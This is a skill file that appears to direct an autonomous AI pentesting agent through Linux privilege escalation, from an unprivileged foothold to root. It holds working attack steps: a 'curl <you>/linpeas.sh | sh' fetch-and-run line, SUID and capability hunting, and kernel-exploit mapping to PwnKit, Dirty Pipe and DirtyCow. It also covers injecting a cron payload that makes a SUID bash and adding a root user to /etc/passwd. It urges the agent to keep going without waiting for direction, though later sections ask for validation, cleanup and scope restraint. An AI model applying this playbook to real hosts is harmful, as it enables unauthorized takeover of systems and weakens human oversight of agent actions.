---
name: linux-privilege-escalation
description: The Linux privilege-escalation playbook — how to go from an unprivileged foothold (e.g. www-data via RCE) to root, SYSTEMATICALLY and without waiting to be told where to look. Use the moment you have any shell/command execution on a Linux host. Fixes the failure mode where the harness gets a foothold then stalls, or thrashes on one vector; gives an ordered enumeration→exploit method and the exact local tools.
metadata:
  category: platforms
  platform: linux
  pairs_with: file-write-rce
  attack_ids: [T1068, T1548, T1053, T1055]
---

# Linux Privilege Escalation

You have execution as an unprivileged user. Your job now is **root** — do not stop
at the foothold. Work this in order; enumerate FIRST, then exploit the
highest-signal vector. When one vector dead-ends, PIVOT — do not grind it.

## 0. Your shell is probably NON-INTERACTIVE — do NOT chase a TTY first

A web RCE / command-injection foothold gives **non-interactive** command execution.
The rookie trap (and a real Pluto failure: 30 minutes burned, root never reached)
is to spend your budget trying to upgrade to an interactive shell — reverse
shells, `pty.fork()` tricks, forcing `su` to accept a password — BEFORE doing any
enumeration. **Root does not require a TTY, and almost none of the vectors below
do.** pkexec/PwnKit, SUID/GTFOBins, writable cron, capability abuse, reading
root-readable files, and version→CVE exploits ALL run fine over a one-shot
non-interactive channel. The ONLY thing that needs a PTY is interactive `su` /
some GTFOBins escapes — so solving the TTY is a **last-resort sub-problem** you
tackle only *after* the TTY-free ladder is exhausted and you've picked a vector
that genuinely needs it. If you catch yourself mutating the same shell-upgrade
technique with no new finding, STOP and run §1–§2.

## 1. Enumerate automatically FIRST (don't hand-roll)

Upload and run a real enum script; triage its RED/HIGH findings before anything
else. These are provisioned locally at `/opt/privesc/`:
- **linpeas**: `/opt/privesc/linpeas.sh` — most thorough; look for red/yellow "95%"
  items. Deliver it to the target and run: `curl <you>/linpeas.sh | sh` or drop it
  via your write primitive and `sh linpeas.sh`.
- **lse**: `/opt/privesc/lse.sh -l1` — lighter, cleaner triage.
- **pspy**: `/opt/privesc/pspy64` — watch for **root cron / scheduled commands**
  running world-writable scripts (no root needed to watch).

## 2. Work the vectors in impact order (all TTY-free unless noted)

0. **Credential you already recovered — check this FIRST.** If you have a
   *validated* password (from a config/`.bak`/DB), its value is highest-signal:
   (a) does that user have sudo rights (`sudo -S -l` reading the password from
   stdin — no TTY needed), (b) does it unlock another account, (c) is it the
   root/DB password reused? A hint the user has escalated before:
   **`~/.sudo_as_admin_successful`** in their home dir means they've run `sudo`
   successfully — check their sudo entitlement immediately.
1. **sudo -l** — NOPASSWD entries → **GTFOBins** (`sudo <bin>` escape to root).
   With a password use `echo '<pw>' | sudo -S -l` (stdin, no TTY).
2. **SUID/SGID**: `find / -perm -4000 -o -perm -2000 2>/dev/null` → GTFOBins for
   each unusual binary.
3. **Kernel / local-root CVE — match what you ALREADY gathered, then run it.**
   You have `uname -a` and package versions in hand; the matching step is
   mandatory, not optional. Map:
   - **`pkexec` present (polkit ≤ 0.105–0.120) → PwnKit (CVE-2021-4034)** — the
     go-to on almost any Ubuntu/Debian incl. **kernel 3.x and 4.x**; check
     `pkexec --version` / `ls -l $(which pkexec)`. Runs non-interactively.
   - **kernel 5.8–5.16 → Dirty Pipe (CVE-2022-0847)**.
   - **kernel ≤ 4.8 (older 2.x–4.x) → DirtyCow (CVE-2016-5195)**; also check
     `overlayfs` local-roots on Ubuntu 16.04-era kernels.
   Compile ON the target when glibc versions differ (a locally-built binary often
   fails with `GLIBC_2.xx not found` — build in the target's environment).
4. **Cron abuse**: a root cron running a **world-writable** script or `chown`/
   `tar *`-in-a-writable-dir → inject a payload (e.g. make a SUID bash) and wait
   for the tick.
5. **Writable sensitive files**: `/etc/passwd` (add a root user), `/etc/shadow`,
   `/etc/cron.d`, `/etc/sudoers.d`, service configs, **group membership**
   (`/etc/group`).
6. **Capabilities**: `getcap -r / 2>/dev/null` (`cap_setuid+ep` → root).

## 3. Make root a Gate-1 FACT (don't just claim it)

A transcript that says "I got root" is not a validated finding — root is only a
ledger fact once the deterministic validator reproduces it. The moment you have
an escalation channel, record the candidate and run **`validate_privilege_escalation`**:
give it two command templates, each containing the literal `{probe}` placeholder
— `baseline_exec` runs a probe as your CURRENT unprivileged user, `escalated_exec`
runs it THROUGH your vector (e.g. `... sudo {probe}`, `/tmp/rootbash -p -c {probe}`).
It confirms baseline is non-root, that the escalated channel returns `uid=0` for a
nonce'd probe, AND that it can read a root-only file (`/etc/shadow`) the baseline
cannot — as an exit-code differential, never the content. A faked `uid=0` banner
that cannot actually read shadow will NOT pass, by design; don't try to game it.

## 4. Prove, then STOP and CLEAN UP

Prove root minimally (`id` showing `euid=0`, read the root flag) — do NOT deploy
persistence. Then **reverse everything you changed**: remove any SUID bit you set
(`chmod u-s`), restore any file you edited (`/etc/group`, cron, configs) to its
ORIGINAL bytes, and delete every uploaded script/exploit/webshell. Verify the
revert (re-read the file) — a partial cleanup that leaves a modified system file
or a live shell is a do-no-harm failure. If a cleanup command is blocked by the
red-lines gate, STOP and ask the operator — do NOT reword it to slip past the gate.

## Restraint

This is exploitation — stay in scope, prove impact minimally, retain no data
beyond evidence, and never leave the target more exposed than you found it.
